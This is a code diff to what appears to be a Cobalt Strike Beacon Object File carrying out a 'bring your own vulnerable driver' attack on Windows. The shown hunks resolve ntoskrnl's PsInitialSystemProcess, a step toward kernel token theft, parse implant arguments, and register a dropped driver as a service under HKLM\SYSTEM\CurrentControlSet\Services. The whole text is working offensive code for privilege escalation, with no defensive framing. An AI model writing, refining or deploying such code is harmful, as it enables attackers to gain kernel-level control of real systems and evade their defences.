@@ -177,12 +177,7 @@ static uint64_t find_ntos_base(void) {
 
 /* Resolve PsInitialSystemProcess export from ntoskrnl in user space to get VA */
 static uint64_t find_ps_initial_system_process(uint64_t ntos_base) {
-    /* Load ntoskrnl copy from disk to resolve exports without mapping in kernel space */
-    /* We use the user-mode ntoskrnl image at its file path but use VA from base export table */
-
-    /* Simpler: get PsInitialSystemProcess via kernel read of export from loaded image.
-     * From user space, we can find the function offset in the on-disk image.
-     * Map ntoskrnl.exe from disk, find PsInitialSystemProcess export RVA, add kernel base. */
+    /* Map ntoskrnl.exe from disk, find PsInitialSystemProcess export RVA, add kernel base. */
     WCHAR path[MAX_PATH] = L"\\\\?\\C:\\Windows\\System32\\ntoskrnl.exe";
     HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -223,17 +218,23 @@ static uint64_t find_ps_initial_system_process(uint64_t ntos_base) {
  *   args: [DWORD drvPathLen][drvPath bytes][DWORD outPathLen][outPath bytes]
  * ----------------------------------------------------------------------- */
 void go(char *args, int args_len) {
-    /* Parse args */
-    struct { char *buf; int pos; int len; } parser = { args, 0, args_len };
-    #define EXTRACT_STR(p, out, olen) do { \
-        if ((p).pos + 4 > (p).len) { BeaconPrintf(CALLBACK_ERROR, "arg parse error\n"); return; } \
-        int _l = *(int *)((p).buf + (p).pos); (p).pos += 4; \
-        (out) = (p).buf + (p).pos; (olen) = _l; (p).pos += _l; } while(0)
+    /* Parse beacon args: each arg is [int32 length][bytes] */
+    int   pos      = 0;
+    char *drv_path = NULL;
+    char *out_path = NULL;
 
-    char *drv_path = NULL; int drv_len = 0;
-    char *out_path = NULL; int out_len = 0;
-    EXTRACT_STR(parser, drv_path, drv_len);
-    EXTRACT_STR(parser, out_path, out_len);
+#define NEXT_STR(dst) do {                                  \
+    if (pos + 4 > args_len) {                               \
+        BeaconPrintf(CALLBACK_ERROR, "[-] arg parse\n");    \
+        return;                                             \
+    }                                                       \
+    int _n = *(int *)(args + pos); pos += 4;                \
+    (dst) = args + pos; pos += _n;                          \
+} while (0)
+
+    NEXT_STR(drv_path);
+    NEXT_STR(out_path);
+#undef NEXT_STR
 
     BeaconPrintf(CALLBACK_OUTPUT, "[byovd] driver: %s\n", drv_path);
     BeaconPrintf(CALLBACK_OUTPUT, "[byovd] output: %s\n", out_path);
@@ -269,11 +270,10 @@ void go(char *args, int args_len) {
     WCHAR reg_path[256] = L"SYSTEM\\CurrentControlSet\\Services\\BiosToolDrv";
     RegCreateKeyExW(HKEY_LOCAL_MACHINE, reg_path, 0, NULL, 0,
                     KEY_ALL_ACCESS, NULL, &hKey, NULL);
-    DWORD dword_val = 1;
-    RegSetValueExW(hKey, L"Type",  0, REG_DWORD, (BYTE*)&dword_val, 4);
-    RegSetValueExW(hKey, L"Start", 0, REG_DWORD, (BYTE*)&dword_val, 4);
-    dword_val = 1;
-    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&dword_val, 4);
+    DWORD type_val = 1, start_val = 3, err_val = 1;
+    RegSetValueExW(hKey, L"Type",         0, REG_DWORD, (BYTE*)&type_val,  4);
+    RegSetValueExW(hKey, L"Start",        0, REG_DWORD, (BYTE*)&start_val, 4);
+    RegSetValueExW(hKey, L"ErrorControl", 0, REG_DWORD, (BYTE*)&err_val,   4);
     WCHAR img_path[MAX_PATH];
     _snwprintf(img_path, MAX_PATH, L"\\??\\%s", tmp_drv);
     RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ,
